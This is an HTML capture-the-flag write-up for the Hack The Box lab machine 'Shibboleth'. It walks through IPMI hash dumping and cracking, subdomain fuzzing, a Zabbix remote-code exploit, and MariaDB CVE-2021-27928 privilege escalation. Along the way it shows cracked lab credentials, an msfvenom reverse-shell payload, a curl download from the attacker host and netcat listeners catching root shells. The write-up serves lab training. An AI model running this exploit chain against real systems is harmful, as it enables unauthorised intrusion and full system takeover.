@@ -1,0 +1,227 @@
+<h1 id="shibboleth">Shibboleth</h1>
+
+<h1 id="skills">Skills</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>The inital enumeration showed only port 80 open.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94 scan initiated Wed Nov  1 16:29:49 2023 as: nmap -p- -n -Pn -vvv -oG fast_2 10.10.11.124</span>
+<span class="c"># Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)</span>
+Host: 10.10.11.124 <span class="o">()</span>   Status: Up
+Host: 10.10.11.124 <span class="o">()</span>   Ports: 80/open/tcp//http///     Ignored State: closed <span class="o">(</span>65534<span class="o">)</span>
+<span class="c"># Nmap done at Wed Nov  1 16:30:23 2023 -- 1 IP address (1 host up) scanned in 33.66 seconds</span>
+</code></pre></div></div>
+
+<p>To access the web we need <code class="language-plaintext highlighter-rouge">shibboleth.htb</code> to point to the machine IP. In this web server we won’t find anything, so we need to enumerate in other parts:</p>
+
+<ul>
+  <li>We could try to look for subdomains</li>
+  <li>We could scan UDP ports and check if any of them are opened</li>
+</ul>
+
+<p>Scanning UDP ports reported the following:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>  <span class="n">REASON</span>
+<span class="mi">623</span><span class="o">/</span><span class="n">udp</span> <span class="nb">open</span>  <span class="n">asf</span><span class="o">-</span><span class="n">rmcp</span> <span class="n">udp</span><span class="o">-</span><span class="n">response</span> <span class="n">ttl</span> <span class="mi">63</span>
+</code></pre></div></div>
+
+<p>Looking in Hacktricks we can see that we can enumerate and potentially get the password hash of the users of this service. First we will enumerate users, but we have to guess one existing user. We can try tipical admin user names and in the end we got one.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/shibboleth/ipmitool]
+└─<span class="nv">$ </span>ipmitool <span class="nt">-I</span> lanplus <span class="nt">-C</span> 0 <span class="nt">-H</span> 10.10.11.124 <span class="nt">-U</span> Administrator <span class="nt">-P</span> root user list
+ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
+1                    <span class="nb">true    false      false      </span>USER
+2   Administrator    <span class="nb">true    false      true       </span>USER
+3                    <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+4                    <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+5                    <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+6                    <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+7                    <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+8                    <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+9                    <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+10                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+11                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+12                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+13                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+14                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+15                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+16                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+17                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+18                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+19                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+20                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+21                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+22                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+23                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+24                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+25                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+26                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+27                   <span class="nb">true    false      false      </span>Unknown <span class="o">(</span>0x00<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Next thing is to retrive his hash, searching in google will gives us the correct tool for this,</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/shibboleth/ipmiPwner]
+└─<span class="nv">$ </span><span class="nb">sudo </span>python ipmipwner.py <span class="nt">--host</span> 10.10.11.124 <span class="nt">-u</span> Administrator <span class="nt">-c</span> john <span class="nt">--password-wordlist</span> /usr/share/wordlists/rockyou.txt <span class="nt">--output-hash</span> <span class="nb">hash</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking <span class="k">if </span>port 623 <span class="k">for </span>host 10.10.11.124 is active
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> The username: Administrator is valid                                                  
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving <span class="nb">hash </span><span class="k">for </span>user: Administrator <span class="k">in </span>file: <span class="s2">"hash"</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> The <span class="nb">hash </span><span class="k">for </span>user: Administrator
+   <span class="se">\_</span> <span class="nv">$rakp$a4a3a2a002140000cc9a3032dc9cdd2bfbc03d23cbdfa7654bdb75e08c9d986c5b4b343c053bdb67a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$798cb1a1d25dc7c9b3c6a6267d77d602f5092151</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting the <span class="nb">hash </span>cracking with john
+                                                                                                                                                                                                                                            
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>RAKP, IPMI 2.0 RAKP <span class="o">(</span>RMCP+<span class="o">)</span> <span class="o">[</span>HMAC-SHA1 128/128 SSE2 4x]<span class="o">)</span>
+Will run 8 OpenMP threads
+Press Ctrl-C to abort, or send SIGUSR1 to john process <span class="k">for </span>status
+ilovepumkinpie1  <span class="o">(</span>10.10.11.124 Administrator<span class="o">)</span>     
+1g 0:00:00:00 DONE <span class="o">(</span>2023-11-02 12:49<span class="o">)</span> 1.265g/s 9457Kp/s 9457Kc/s 9457KC/s in_SecT..iarhsm
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<p>And we got <code class="language-plaintext highlighter-rouge">Administrator:ilovepumkinpie1</code> as new credentials, but there is no SSH in the machine or login panel in the web, so we are missing something. We will enumerate subdomains.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/shibboleth]
+└─<span class="nv">$ </span>wfuzz <span class="nt">--hc</span> 404 <span class="nt">-L</span>  <span class="nt">-w</span> ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-H</span> <span class="s1">'Host: FUZZ.shibboleth.htb'</span> http://shibboleth.htb
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://shibboleth.htb/
+Total requests: 220547
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000001601:   200        29 L     219 W      3684 Ch     "monitor"
+</span></code></pre></div></div>
+
+<p>We got one subdomain called <code class="language-plaintext highlighter-rouge">monitor.shibboleth.htb</code> . This is a virtual host so we add it to the <strong>hosts</strong> file and acccess the new domain. Here we can see a login panel and our gathered credentials actually work.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>As we can see the web is a Zabbix service, which is used to monitor net elements. We can try to search in Google if there is any way to execute commands, and indeed, there is one.  We can use the following exploit <a href="https://www.exploit-db.com/exploits/50816">https://www.exploit-db.com/exploits/50816</a> to execute a command in the server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/shibboleth]
+└─<span class="nv">$ </span> python rce.py http://monitor.shibboleth.htb Administrator ilovepumkinpie1 10.10.14.12 4444
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> this exploit is tested against Zabbix 5.0.17 only
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> can reach the author @ https://hussienmisbah.github.io/
+<span class="o">[</span>+] the payload has been Uploaded Successfully
+<span class="o">[</span>+] you should find it at http://monitor.shibboleth.htb/items.php?form<span class="o">=</span>update&amp;hostid<span class="o">=</span>10084&amp;itemid<span class="o">=</span>33617
+<span class="o">[</span>+] <span class="nb">set </span>the listener at 4444 please...
+<span class="o">[</span>?] note : it takes up to +1 min so be patient :<span class="o">)</span>
+<span class="o">[</span>+] got a shell ? <span class="o">[</span>y]es/[N]o:
+</code></pre></div></div>
+
+<p>We are supposed to have a shell in less than a minute but if not we can access the link and click on <strong>Execute Now</strong> bottom and in less than a minute we will have a shell in our listener.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/shibboleth/ipmitool]
+└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.124] 48896
+sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami     
+zabbix
+</span></code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>We can check what other users are in the system, after getting a full interactive shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zabbix@shibboleth:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>sh  
+root:x:0:0:root:/root:/bin/bash
+ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
+</code></pre></div></div>
+
+<p>Since we see a user we can try the password <code class="language-plaintext highlighter-rouge">ilovepumkinpie1</code> to log in as hi, and we get a shell as this new user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zabbix@shibboleth:/<span class="nv">$ </span>su ipmi-svc    
+Password: 
+ipmi-svc@shibboleth:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>This new user must have any new rights that we can leverage in order to escalate privileges, but we are in no new groups and we cannot execute sudo. We can try to look for files in other directories out from our home directory that belongs to the user <code class="language-plaintext highlighter-rouge">ipmi-svc</code> or to his group. Diretories that we want to search are normally <code class="language-plaintext highlighter-rouge">/etc</code>, <code class="language-plaintext highlighter-rouge">/var</code> and <code class="language-plaintext highlighter-rouge">/opt</code> .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipmi-svc@shibboleth:~<span class="nv">$ </span>find /etc/ <span class="nt">-user</span> <span class="s1">'ipmi-svc'</span> 2&gt;/dev/null <span class="nt">-ls</span>
+ipmi-svc@shibboleth:~<span class="nv">$ </span>find /etc/ <span class="nt">-group</span> <span class="s1">'ipmi-svc'</span> 2&gt;/dev/null <span class="nt">-ls</span>
+1885     24 <span class="nt">-rw-r-----</span>   1 root    ipmi-svc    22306 Oct 18  2021 /etc/zabbix/zabbix_server.conf.dpkg-dist
+39531    24 <span class="nt">-rw-r-----</span>   1 root    ipmi-svc    21863 Apr 24  2021 /etc/zabbix/zabbix_server.conf
+</code></pre></div></div>
+
+<p>If check what’s inside  <code class="language-plaintext highlighter-rouge">/etc/zabbix/zabbix_server.conf</code> we will get a lot of commented lines. We can erase those from the output with the following command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipmi-svc@shibboleth:~<span class="nv">$ </span><span class="nb">cat</span> /etc/zabbix/zabbix_server.conf | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s1">'^#'</span> | <span class="nb">sed</span> <span class="s1">'/^\s*$/d'</span>
+<span class="nv">LogFile</span><span class="o">=</span>/var/log/zabbix/zabbix_server.log
+<span class="nv">LogFileSize</span><span class="o">=</span>0
+<span class="nv">PidFile</span><span class="o">=</span>/run/zabbix/zabbix_server.pid
+<span class="nv">SocketDir</span><span class="o">=</span>/run/zabbix
+<span class="nv">DBName</span><span class="o">=</span>zabbix
+<span class="nv">DBUser</span><span class="o">=</span>zabbix
+<span class="nv">DBPassword</span><span class="o">=</span>bloooarskybluh
+<span class="nv">SNMPTrapperFile</span><span class="o">=</span>/var/log/snmptrap/snmptrap.log
+<span class="nv">Timeout</span><span class="o">=</span>4
+<span class="nv">AlertScriptsPath</span><span class="o">=</span>/usr/lib/zabbix/alertscripts
+<span class="nv">ExternalScripts</span><span class="o">=</span>/usr/lib/zabbix/externalscripts
+<span class="nv">FpingLocation</span><span class="o">=</span>/usr/bin/fping
+<span class="nv">Fping6Location</span><span class="o">=</span>/usr/bin/fping6
+<span class="nv">LogSlowQueries</span><span class="o">=</span>3000
+<span class="nv">StatsAllowedIP</span><span class="o">=</span>127.0.0.1
+</code></pre></div></div>
+
+<p>And we get a password and a user for the database. Next step is to connect to the database.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipmi-svc@shibboleth:~<span class="nv">$ </span>mysql <span class="nt">-uzabbix</span> <span class="nt">-pbloooarskybluh</span> 
+Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MariaDB connection <span class="nb">id </span>is 483
+Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span>
+</code></pre></div></div>
+
+<p>The first thing we can check if the MariaDB version which is <code class="language-plaintext highlighter-rouge">10.3.25-MariaDB-0ubuntu0.20.04.1</code> . The result is a PrivEsc exploit for the version, we can get it from this repository https://github.com/Al1ex/CVE-2021-27928. Following the steps, we can finally get a shell as root.</p>
+
+<ul>
+  <li>First we generate our payload</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.12 <span class="nv">LPORT</span><span class="o">=</span>5555 <span class="nt">-f</span> elf-so <span class="nt">-o</span> CVE-2021-27928.so
+</code></pre></div></div>
+
+<ul>
+  <li>Then we upload this to the victim and set a listener in the specified port</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipmi-svc@shibboleth:~<span class="nv">$ </span>curl 10.10.14.12/CVE-2021-27928.so <span class="nt">-o</span> CVE-2021-27928.so
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   476  100   476    0     0   4533      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--  4533
+ipmi-svc@shibboleth:~<span class="nv">$ </span><span class="nb">ls
+</span>CVE-2021-27928.so  user.txt
+</code></pre></div></div>
+
+<ul>
+  <li>We trigger the vulnerability</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipmi-svc@shibboleth:~<span class="nv">$ </span>mysql <span class="nt">-uzabbix</span> <span class="nt">-pbloooarskybluh</span> <span class="nt">-e</span> <span class="s1">'SET GLOBAL wsrep_provider="/home/ipmi-svc/CVE-2021-27928.so";'</span>
+ERROR 2013 <span class="o">(</span>HY000<span class="o">)</span> at line 1: Lost connection to MySQL server during query
+</code></pre></div></div>
+
+<p>Finally we should get a shell in our listener.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 5555
+listening on <span class="o">[</span>any] 5555 ...
+connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.124] 44314
+<span class="nb">whoami
+</span>root
+</code></pre></div></div>
